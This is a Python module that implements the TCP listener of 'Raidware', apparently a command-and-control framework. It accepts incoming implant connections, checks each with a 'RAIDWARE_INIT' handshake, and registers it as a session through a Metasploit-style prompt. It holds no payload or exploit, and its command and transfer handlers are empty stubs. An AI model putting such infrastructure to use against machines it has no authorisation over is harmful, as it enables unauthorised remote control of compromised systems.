''' Raidware imports '''
from listeners import *
from utils.utils import *

from time import sleep
from socket import *
from threading import Thread

class Listener(BaseListener):

    type = "TCP | Non-Staged"

    def __init__(self, ip_addr="0.0.0.0", port=4444):

        ''' Fetching the defaults from the config file '''
        config = fetch_config('tcp')

        self.ip_addr   = config['addr']
        self.port      = int(config['port'])
        self.BEGIN_DEL = config['begin']
        self.DELIMITER = config['delimiter']

        self.opts = {
            "LHOST" : self.ip_addr,
            "LPORT" : self.port,
            "BEGIN_DELIMITER" : self.BEGIN_DEL,
            "END_DELIMITER" : self.DELIMITER
        }

        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.thread = None

        self.rcvd = {}

    def __update__(self):
        self.ip_addr, self.port, self.BEGIN_DEL, self.DELIMITER = self.opts.values()
        try:
            self.port = int(self.port)
        except:
            log_error("Invalid value set for port")
            self.port = 9001

    def __repr__(self):
        return f"TCP(Hostname: {self.ip_addr}, Port: {self.port} | {self.type})"

    def __color__(self):
        return f"[GREEN]TCP[RESET]([MAGENTA]Hostname:[RESET][BLUE] {self.ip_addr}[RESET], [MAGENTA]Port[RESET]: [CYAN]{self.port}[RESET], [MAGENTA]Type: [YELLOW]{self.type.split(' | ')[0]}[RESET] -- [GREEN]{self.type.split(' | ')[1]}[RESET])"

    def __str__(self):
        return self.__repr__()


    def __listen__(self):

        def __verify__(conn : socket):
            print()
            log_info("A connection has been received. Verifying the connection...")
            uid = create_new_UID()
            self.onSend(uid, socket=conn)
            recv = self.onRecv(socket=conn)
            return recv == "RAIDWARE_INIT", uid

        try:
            self.sock.bind((self.ip_addr, self.port))
        except:
            log_error("([GREEN]TCP[RESET]) Failed to bind to the specified address and port.")
            self.sock = None

        if self.sock == None:
            log_error("([GREEN]TCP[RESET]) An error had occurred when creating the socket for listener. Please check...")
            return

        self.sock.listen()
        log_info(f"([GREEN]TCP[RESET]) Listening on [CYAN]{self.ip_addr}[RESET]:[CYAN]{self.port}[RESET]")

        enabled_Listeners[create_new_UID()] = self

        while True:
            conn, addr = self.sock.accept()

            ''' Verifying the received connection... '''
            ret = __verify__(conn)
            if not ret[0]:
                log_error("Connection was received but we were unable to validate if it was our own.")
                continue

            log_info(f"([GREEN]TCP[RESET]) Received a connection from {addr[0]}:{addr[1]}")
            print()
            connections[ret[1]] = Connection(UID=ret[1], listener=self, _type=self.type, base=conn)

    def __help__(self):
        self.__options__()

    def setopts(self, **kwargs):
        print()
        log_info("Please set the options required for [GREEN]TCP[RESET] listener.\nType \"[BLUE]options[RESET]\" to check the available options.\nType \"[BLUE]set[RESET] [GREEN]<variable_name>[RESET] [RED]<value>[RESET]\" to change the value of a variable\nType [RED]RUN[RESET] to enable the listener")

        while True:
            _in = input(
                    colorize(
                        f"([GREEN]TCP[RESET]) {basic_prompt} {prompt} "
                    )
                )

            if _in == "" or _in == None:
                continue

            cmds = ["options", "set", "help", "-h", "--help", "done", "exploit", "run", "enable", "exit", "quit"]
            vars = [i.lower() for i in self.opts.keys()]

            _in = _in.split()
            if _in[0].lower() not in cmds:
                log_error(f"Invalid command \"[RED]{_in[0]}[RESET]\"")
                continue

            verify = _in[0].lower()

            if verify == "options":
                self.__options__()
                continue

            if verify == "help" or verify == "-h" or verify == "--help":
                self.__help__()
                continue

            if verify == 'set':
                if len(_in) != 3:
                    log_error("[BLUE]SET[RESET] commands requires 2 arguments. [GREEN]<variable_name>[RESET] and [RED]<new_value>[RESET]")
                    continue
                else:
                    var, new_val = _in[1], _in[2]
                    if var.lower() not in vars:
                        log_error(f"Invalid variable \"[RED]{var}[RESET]\" specified. Please type \"OPTIONS\" to check the available variables.")
                        continue

                    else:
                        self.opts[var.upper()] = new_val
                        log_info(f"Successfully set [GREEN]{var}[RESET] to [RED]{new_val}[RESET]")
                        self.__update__()
                        continue

            if verify == 'exit' or verify == 'quit':
                log_error("Did not start the [GREEN]TCP[RESET] listener!")
                return

            if verify == 'done' or verify == 'exploit' or verify == 'run' or verify == 'enable':
                self.onLoad()
                sleep(1)
                return

            


    def __options__(self):
        from tabulate import tabulate
        print()
        log_info(f"([GREEN]TCP[RESET]) Following options exist: ")
        print(
            '\n',
            tabulate(
                [self.opts.values()],
                headers=self.opts.keys()
            ),
            '\n'
        )

    def onLoad(self):
        ''' Spawing a new thread to listen for incoming connections. '''
        self.thread = Thread(target=self.__listen__, daemon=True)
        self.thread.start()

    def onDownload(self):
        pass

    def onUpload(self):
        pass

    def onCommand(self):
        pass

    def onSend(self, msg : str, **kwargs):
        socket = self.sock if 'socket' not in kwargs.keys() else kwargs['socket']

        msg = self.BEGIN_DEL + "{" + msg + "}" + self.DELIMITER
        try:
            socket.send(msg.encode())
        except ConnectionResetError:
            log_error(f"Connection lost...")
            return None

    def onRecv(self, **kwargs):

        socket = self.sock if 'socket' not in kwargs.keys() else kwargs['socket']
        try:
            buf = socket.recv(4096).decode()
        except ConnectionResetError:
            log_error(f"Connection lost...")
            return None

        buf = buf.split(self.BEGIN_DEL)[1].split(self.DELIMITER)[0][1:]
        return buf[:-1]